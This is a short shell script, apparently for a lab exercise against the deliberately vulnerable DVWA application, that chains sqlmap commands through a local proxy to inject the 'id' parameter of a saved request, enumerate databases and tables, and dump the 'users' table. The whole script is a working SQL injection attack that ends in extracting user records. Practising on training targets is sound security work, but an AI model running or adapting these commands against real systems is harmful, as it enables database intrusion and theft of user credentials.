#!/bin/sh
echo "[*] Looking for Databases"
python3 sqlmap-dev/sqlmap.py --proxy=http://127.0.0.1:8080 -r request.txt -p id --dbs
sleep 3
python3 sqlmap-dev/sqlmap.py --proxy=http://127.0.0.1:8080 -r request.txt -p id -D dvwa --tables
sleep 3
python3 sqlmap-dev/sqlmap.py --proxy=http://127.0.0.1:8080 -r request.txt -p id -D dvwa -T users --dump
